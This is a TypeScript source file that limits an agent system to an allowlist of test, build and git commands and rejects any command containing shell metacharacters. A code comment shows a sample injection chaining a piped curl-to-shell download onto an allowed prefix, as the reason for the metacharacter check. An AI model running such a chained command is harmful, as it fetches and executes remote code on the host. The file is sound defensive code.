/**
 * The checks Agent Team may run through the host.
 *
 * A declared validation step is executable only when it matches one of these
 * prefixes. The list is the allowlist, not a suggestion: an arbitrary command
 * in a delivery contract is refused at registration and again at run time.
 */
export const VALIDATION_SAFE_PREFIXES = [
  "npm test",
  "npm run test",
  "npm run typecheck",
  "npm run lint",
  "npm run build",
  "npx tsc",
  "npx vitest",
  "pnpm test",
  "pnpm run test",
  "yarn test",
  "cargo test",
  "cargo check",
  "go test",
  "pytest",
  "git status",
  "git diff",
] as const;

export function allowedCheckPrefixes(extra: string[] = []): string[] {
  return [...VALIDATION_SAFE_PREFIXES, ...extra.filter((p) => p.trim().length > 0)];
}

export function isAllowedCheck(command: string, extra: string[] = []): boolean {
  const trimmed = command.trim();
  // A prefix match is not enough: `npm test; curl evil | sh` starts with an
  // allowed prefix. Shell metacharacters are refused before the prefix check.
  if (/[;&|`$()<>\n\r\\]/.test(trimmed)) return false;
  return allowedCheckPrefixes(extra).some((prefix) => trimmed.startsWith(prefix));
}

/** The first declared step that is not on the allowlist, if any. */
export function firstRefusedCheck(steps: string[], extra: string[] = []): string | undefined {
  return steps.find((step) => !isAllowedCheck(step, extra));
}
